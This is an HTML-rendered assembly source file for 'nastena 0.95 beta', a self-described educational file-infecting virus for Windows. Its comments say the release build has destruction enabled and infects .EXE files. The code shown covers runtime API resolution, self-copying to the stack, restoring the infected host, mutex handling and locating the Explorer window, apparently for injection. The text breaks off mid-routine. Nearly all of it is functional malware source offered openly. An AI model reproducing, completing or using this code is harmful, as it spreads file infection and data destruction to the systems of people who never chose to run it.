<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>release.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;============================nastena 0.95 beta==============================;</span><span class="sc0">
</span><span class="sc1">;    This source is for educational purposes only. Author does not take     ;</span><span class="sc0">
</span><span class="sc1">;            responsibility for the consequences of its usage               ;</span><span class="sc0">
</span><span class="sc1">;                   This is open-source program                             ;</span><span class="sc0">
</span><span class="sc2">.586</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0"> 
</span><span class="sc5">jumps</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; debug console</span><span class="sc0">
</span><span class="sc5">RELEASE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">NORELEASE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;RELEASE=0 NORELEASE=1 -    destruction off, infecting *.MZD, </span><span class="sc0">
</span><span class="sc1">;                   beep at infection</span><span class="sc0">
</span><span class="sc1">;RELEASE=1 NORELEASE=0 -    destruction on,  infecting *.EXE</span><span class="sc0">

</span><span class="sc5">callW</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">f</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">f</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">f</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">windows.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">consts.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">pestruct.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">structs.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">eaxapi1.inc</span><span class="sc0"> </span><span class="sc1">;definitions of macro</span><span class="sc0">
</span><span class="sc5">MB_TOPMOST</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40000h</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dropper</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    
</span><span class="sc5">_exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">300000</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">


</span><span class="sc1">;org 100h</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">".beg."</span><span class="sc0">
</span><span class="sc5">virstart</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_realstart</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;  after decryption execution gets here</span><span class="sc0">
</span><span class="sc5">_start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recalc</span><span class="sc0">
</span><span class="sc5">recalc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">rec</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5Dh</span><span class="sc0"> </span><span class="sc1">; pop ebp</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_kernel</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">kernel32_api_num</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">__Kernel32</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">_LoadLibraryA</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__Kernel32</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_apis</span><span class="sc0"> </span><span class="sc1">; get kernel32 apis</span><span class="sc0">


    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">thread1</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">

    </span><span class="sc1">; restore host program if not dropper</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__567</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">replace</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.to_rva</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">backup</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.sizeinbytes</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">VirtualProtect</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc1">; восстан. jmp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">isjmp</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">__567</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jmpreplace</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.to_rva</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jmpbackup</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">jmpsize</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">VirtualProtect</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc5">__567</span><span class="sc4">:</span><span class="sc0">
    

</span><span class="sc5">_out</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">__return_to_host</span><span class="sc0">
    </span><span class="sc1">; exit thread if dropper</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">
</span><span class="sc5">__return_to_host</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; return to host if not dropper</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__jmp_addr</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">retaddr</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__jmp_addr</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0"> </span><span class="sc1">; jmp far</span><span class="sc0">
</span><span class="sc5">__jmp_addr</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">retaddr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_exit</span><span class="sc1">;401000h</span><span class="sc0">

</span><span class="sc1">; macro</span><span class="sc0">
</span><span class="sc5">copy_to_stack</span><span class="sc0">   </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">thread1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_stack_exec1</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0"> </span><span class="sc5">ddx</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">
</span><span class="sc5">thread1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ddx</span><span class="sc0">
</span><span class="sc5">ddx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ddx</span><span class="sc4">-</span><span class="sc5">recalc</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">recalc</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">)</span><span class="sc1">; test if we are in stack</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_stack_exec1</span><span class="sc0">
    </span><span class="sc1">; not in stack</span><span class="sc0">
    </span><span class="sc1">; copy ourselves to stack</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virsize</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; align esp to 4 </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virstart</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virsize</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc5">thread1</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">)]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

    </span><span class="sc5">copy_to_stack</span><span class="sc0"> </span><span class="sc5">thread1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_stack_exec1</span><span class="sc0">

</span><span class="sc5">_stack_exec1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">500h</span><span class="sc0">

    </span><span class="sc1">; load remaining DLL</span><span class="sc0">
</span><span class="sc5">__user32</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">_MessageBoxA</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_user32</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit_thread1</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_Default</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__user32</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">user32_api_num</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_apis</span><span class="sc0">

</span><span class="sc5">__psapi</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">_EnumProcessModules</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_psapi</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">__54</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_Default</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__psapi</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">psapi_api_num</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_apis</span><span class="sc0">

</span><span class="sc5">__54</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">__msvcrt</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">_sprintf</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_msvcrt</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_Default</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__msvcrt</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msvcrt_api_num</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_apis</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc1">;)  </span><span class="sc0">
</span><span class="sc5">openm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mutexname</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1f0001h</span><span class="sc0">    </span><span class="sc1">; MUTEX_ALL_ACCESS</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">OpenMutex</span><span class="sc0">

    </span><span class="sc1">; wait for release of mutex</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hmutex</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">processing</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">WaitForSingleObject</span><span class="sc0">


    </span><span class="sc1">; mutex is released</span><span class="sc0">

</span><span class="sc5">processing</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">isseh</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc1">;   jmp run_local_thread</span><span class="sc0">
    </span><span class="sc1">; let us go</span><span class="sc0">

    </span><span class="sc1">; look for explorer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'d'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'nWya'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'rT_l'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'lehS'</span><span class="sc0"> </span><span class="sc1">;Shell_TrayWnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">FindWindowA</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">foregr_win</span><span class="sc1">;exit_thread1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cy1</span><span class="sc0">
    </span><span class="sc1">; if no explorer, get topmost window</span><span class="sc0">
</span><span class="sc5">foregr_win</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">GetForegroundWindow</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">cy1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
